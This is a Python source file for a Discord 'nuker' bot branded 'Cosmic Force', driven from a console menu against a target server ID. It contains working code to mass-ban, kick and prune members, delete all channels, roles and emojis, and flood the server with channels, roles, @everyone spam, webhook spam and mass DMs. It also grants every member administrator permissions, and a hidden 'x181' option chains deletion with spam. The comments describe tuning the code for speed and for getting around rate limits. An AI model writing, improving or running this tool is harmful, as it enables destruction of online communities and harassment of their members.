import os
import discord
import asyncio
import random
import aiohttp
from discord.ext import commands
import webbrowser
import sys
from rich.console import Console
from rich.text import Text
from rich.live import Live
import math
from dotenv import load_dotenv

console = Console()
load_dotenv()

raw_token = os.getenv('DISCORD_TOKEN')

if not raw_token:
    print("Error: .env 파일에 'DISCORD_TOKEN'이 설정되지 않았습니다.")
    sys.exit()

BOT_TOKENS = [raw_token]
bots = []
current_guild_id = None

async def ainput(prompt=""):
    loop = asyncio.get_event_loop()
    return await loop.run_in_executor(None, input, prompt)

class ConsoleEngine(commands.Bot):
    def __init__(self, token):
        self.token = token
        intents = discord.Intents.all() 
        super().__init__(
            command_prefix="dummy!",
            intents=intents
        )

def get_target_guild(bot):
    if current_guild_id is None:
        return None
    return bot.get_guild(current_guild_id)

# --- 유틸리티: 레이트 리밋 방지용 미세 지연 ---
async def smart_delay():
    await asyncio.sleep(random.uniform(0.01, 0.03))

async def Ban_members():
    for bot in bots:
        guild = get_target_guild(bot)
        if guild:
            print(f"Target: {guild.name} | Banning members...")
            async def ban_and_log(member):
                try:
                    if member.id != bot.user.id:
                        await guild.ban(member, reason="Nuked by Cosmic Force owner")
                        print(f"Succesfully Banned: {member.name}")
                except discord.HTTPException as e:
                    if e.status == 429: await asyncio.sleep(e.retry_after)
                except: pass
            tasks = [ban_and_log(m) for m in guild.members]
            await asyncio.gather(*tasks, return_exceptions=True)
            print(f"Ban process finished!")
            break

async def Create_channels():
    count_str = await ainput("Number to Create : ")
    count = int(count_str) if count_str.isdigit() else 0
    print("Enter channel names (If multiple, separate with ',')")
    name_input = await ainput("Channel Names : ")
    if not name_input.strip():
        names = ["nuked-by-COSMIC FORCE", "●█▀█▄", "무릎을-꿇어라"]
    else:
        names = [n.strip() for n in name_input.split(",")]
    for bot in bots:
        guild = get_target_guild(bot)
        if guild:
            async def create_and_log():
                try:
                    target_name = random.choice(names)
                    new_chan = await guild.create_text_channel(name=target_name)
                    print(f"Created Channel: {new_chan.name}")
                except discord.HTTPException as e:
                    if e.status == 429: await asyncio.sleep(e.retry_after)
                except: pass
            tasks = [create_and_log() for _ in range(count)]
            await asyncio.gather(*tasks, return_exceptions=True)
            print(f"Successfully created {count} channels!")
            break

async def Delete_channels():
    for bot in bots:
        guild = get_target_guild(bot)
        if guild:
            channels = guild.channels
            total_count = len(channels)
            print(f"Attempting to delete {total_count} channels in {guild.name}...")
            async def delete_and_log(channel):
                try:
                    c_name = channel.name
                    c_type = str(channel.type)
                    await channel.delete()
                    print(f"Deleted [{c_type}]: {c_name}") # 삭제 로그 상세화
                except discord.HTTPException as e:
                    if e.status == 429: await asyncio.sleep(e.retry_after)
                except: pass
            tasks = [delete_and_log(c) for c in channels]
            await asyncio.gather(*tasks, return_exceptions=True)
            print(f"Channel deletion complete.")
            break

async def Spam_channels(attack_limit, custom_msg):
    for bot in bots:
        guild = get_target_guild(bot)
        if guild:
            count = 0
            print(f"Starting [Self-Healing] Spam in {guild.name}...")
            while count < attack_limit:
                if len(guild.text_channels) == 0:
                    try: await guild.create_text_channel(name="nuked-by-cosmic")
                    except: pass
                async def send_and_log(chan):
                    try:
                        await chan.send(custom_msg)
                        print(f"Sent Message: {chan.name}")
                    except discord.NotFound:
                        try:
                            re_ch = await guild.create_text_channel(name="cosmic-force-never-dies")
                            await re_ch.send(custom_msg)
                        except: pass
                    except discord.HTTPException as e:
                        if e.status == 429: await asyncio.sleep(e.retry_after)
                    except: pass
                tasks = [send_and_log(chan) for chan in guild.text_channels]
                await asyncio.gather(*tasks, return_exceptions=True)
                count += 1
                print(f"--- Cycle {count}/{attack_limit} ---")
                await smart_delay()
            break

async def Kick_members():
    for bot in bots:
        guild = get_target_guild(bot)
        if guild:
            tasks = [m.kick(reason="Nuked") for m in guild.members if m.id != bot.user.id]
            await asyncio.gather(*tasks, return_exceptions=True)
            print(f"Kicked members in {guild.name}")
            break

async def Prune_members():
    for bot in bots:
        guild = get_target_guild(bot)
        if guild:
            pruned = await guild.prune_members(days=7, compute_prune_count=True, reason="Nuked")
            print(f"Pruned {pruned} members")
            break

# --- 역할 생성 속도 최적화 ---
async def Create_roles():
    count_ans = await ainput("Number of roles: ")
    count = int(count_ans) if count_ans.isdigit() else 0
    name_input = await ainput("Role Names : ")
    names = [n.strip() for n in name_input.split(",")] if name_input.strip() else ["Nuked by Cosmic Force"]
    
    for bot in bots:
        guild = get_target_guild(bot)
        if guild:
            async def role_task():
                try:
                    role = await guild.create_role(name=random.choice(names), color=discord.Color.random())
                    print(f"Created Role: {role.name}")
                    await smart_delay()
                except discord.HTTPException as e:
                    if e.status == 429: await asyncio.sleep(e.retry_after)
                except: pass
            tasks = [role_task() for _ in range(count)]
            await asyncio.gather(*tasks, return_exceptions=True)
            print(f"Role creation flood finished.")
            break

# --- 역할 삭제 속도 최적화 ---
async def Delete_roles():
    for bot in bots:
        guild = get_target_guild(bot)
        if guild:
            roles = [r for r in guild.roles if not r.managed and r.name != "@everyone"]
            print(f"Deleting {len(roles)} roles...")
            async def del_role_task(role):
                try:
                    r_name = role.name
                    await role.delete()
                    print(f"Deleted Role: {r_name}")
                except discord.HTTPException as e:
                    if e.status == 429: await asyncio.sleep(e.retry_after)
                except: pass
            tasks = [del_role_task(r) for r in roles]
            await asyncio.gather(*tasks, return_exceptions=True)
            print("Role deletion complete.")
            break

# --- DM 스팸 속도 최적화 ---
async def DM_spam(dm_count, custom_msg):
    sem = asyncio.Semaphore(30) # 동시 처리량 증가
    async def safe_send(member):
        async with sem:
            for _ in range(dm_count):
                try:
                    await member.send(custom_msg)
                    print(f"DM Sent -> {member.name}")
                    await asyncio.sleep(0.01) # 전송 간 최소 대기
                except discord.HTTPException as e:
                    if e.status == 429: 
                        await asyncio.sleep(e.retry_after)
                        continue
                    break # 차단 등 기타 에러 시 중단
                except: break
    for bot in bots:
        guild = get_target_guild(bot)
        if guild:
            await guild.chunk()
            members = [m for m in guild.members if not m.bot]
            tasks = [safe_send(m) for m in members]
            await asyncio.gather(*tasks, return_exceptions=True)
            print("DM Spam finished")
            break

async def Delete_emojis():
    for bot in bots:
        guild = get_target_guild(bot)
        if guild:
            tasks = [e.delete() for e in guild.emojis]
            await asyncio.gather(*tasks, return_exceptions=True)
            print("Deleted emojis.")
            break

async def Give_Admin():
    for bot in bots:
        guild = get_target_guild(bot)
        if guild:
            try:
                role = await guild.create_role(name=".", permissions=discord.Permissions.all())
                tasks = []
                for member in guild.members:
                    if not member.bot:
                        async def add_r(m, r):
                            try: await m.add_roles(r); print(f"Admin -> {m.name}")
                            except: pass
                        tasks.append(add_r(member, role))
                await asyncio.gather(*tasks, return_exceptions=True)
            except: pass
            break

async def Rename_Server():
    new_name = await ainput("New Server Name : ")
    for bot in bots:
        guild = get_target_guild(bot)
        if guild:
            try: await guild.edit(name=new_name); print(f"Renamed: {new_name}")
            except: pass
            break

async def Webhook_Spam():
    msg = await ainput("Webhook Spam Message : ")
    count_str = await ainput("Number of Webhooks per channel (Max 15) : ")
    num = int(count_str) if count_str.isdigit() else 1
    for bot in bots:
        guild = get_target_guild(bot)
        if guild:
            for channel in guild.text_channels:
                try:
                    existing = await channel.webhooks()
                    to_create = min(num, 15 - len(existing))
                    for _ in range(to_create):
                        webhook = await channel.create_webhook(name="Cosmic Force")
                        asyncio.create_task(webhook.send(msg))
                        print(f"Webhook created in {channel.name}")
                except: pass
            break

PURPLE_GRADIENTS = [((30, 0, 50), (100, 0, 150)), ((90, 0, 150), (200, 0, 255))]
BORDER_PURPLE = (80, 0, 120)
NEON_PURPLE = (220, 150, 255)
_tick = 0.0

def print(*args, **kwargs):
    global _tick
    s = " ".join(str(a) for a in args)
    lines = s.splitlines()
    text = Text()
    for li, line in enumerate(lines):
        g1, g2 = PURPLE_GRADIENTS[li % len(PURPLE_GRADIENTS)]
        phase = _tick + li * 0.7
        for ci, ch in enumerate(line):
            wave = (math.sin(phase + ci * 0.18) + 1) / 2
            if ch.isdigit(): r, g, b = NEON_PURPLE
            elif ch in "╔╗╚╝═║╦╩╠╣": r, g, b = BORDER_PURPLE
            else:
                r = int(g1[0] + (g2[0] - g1[0]) * wave)
                g = int(g1[1] + (g2[1] - g1[1]) * wave)
                b = int(g1[2] + (g2[2] - g1[2]) * wave)
            text.append(ch, style=f"rgb({r},{g},{b})")
        text.append("\n")
    console.print(text, end="")
    _tick += 0.15

async def Print_menu():
    os.system("cls" if os.name == "nt" else "clear")
    g_name = "None"
    for bot in bots:
        g = get_target_guild(bot)
        if g: g_name = g.name; break
    print(r"""
                ____     ____    __      ____  ______  _  __
               / __ \   / __ \  / /     /  _/ /_  __/ | |/ /
              / / / /  / /_/ / / /      / /    / /    |   / 
             / /_/ /  / _, _/ / /___  _/ /    / /    /   |  
             \____/  /_/ |_| /_____/ /___/   /_/    /_/|_|   V2 TURBO
    """)
    print(f"                        [ Target: {g_name} ]")
    print(r"""        ╚╦╗                                              ╔╦╝
                ╔═══════╩══════════════════════════════════════════════╩═══════╗
                ║ (1) Ban All       (5) Create Roles    (9)  Spam Channels     ║
                ║ (2) Kick All      (6) Delete Channels (10) DM Spam           ║
                ║ (3) Prune         (7) Delete Roles    (11) Give Admin        ║
                ║ (4) Create Chan   (8) Delete Emojis   (12) Rename Server     ║
                ╠══════════════════════════════════════════════════════════════╣
                ║ (13) Webhook Spam (14) Change Server  (15) Exit              ║
                ╚═══════╦══════════════════════════════════════════════╦═══════╝
                      ╔╩╝                                              ╚╩╗
    """)

async def choice_numbers():
    global current_guild_id
    while True:
        if current_guild_id is None:
            val = await ainput("\nEnter Target ID: ")
            if val.isdigit(): current_guild_id = int(val); await Print_menu()
            else: continue
        choice = await ainput("\n>> ")
        if choice == "1": await Ban_members()
        elif choice == "2": await Kick_members()
        elif choice == "3": await Prune_members()
        elif choice == "4": await Create_channels()
        elif choice == "5": await Create_roles()
        elif choice == "6": await Delete_channels()
        elif choice == "7": await Delete_roles()
        elif choice == "8": await Delete_emojis()
        elif choice == "9":
            ans = await ainput("Number: "); msg = await ainput("Msg: ")
            await Spam_channels(int(ans) if ans.isdigit() else 0, msg or "@everyone Nuked")
        elif choice == "10":
            ans = await ainput("Number: "); msg = await ainput("Msg: ")
            await DM_spam(int(ans) if ans.isdigit() else 1, msg or "Raided.")
        elif choice == "11": await Give_Admin()
        elif choice == "12": await Rename_Server()
        elif choice == "13": await Webhook_Spam()
        elif choice == "14": current_guild_id = None; continue
        elif choice == "15": return
        elif choice == "x181":
            await Delete_channels(); await Create_channels(); await Spam_channels(100, "@everyone Nuked")
        await asyncio.sleep(1); await Print_menu()

async def main():
    for token in BOT_TOKENS:
        bot = ConsoleEngine(token)
        bots.append(bot)
        asyncio.create_task(bot.start(token))
    await asyncio.sleep(5)
    await Print_menu()
    try: await choice_numbers()
    finally:
        for bot in bots: await bot.close()

if __name__ == "__main__":
    try: asyncio.run(main())
    except (KeyboardInterrupt, SystemExit): sys.exit()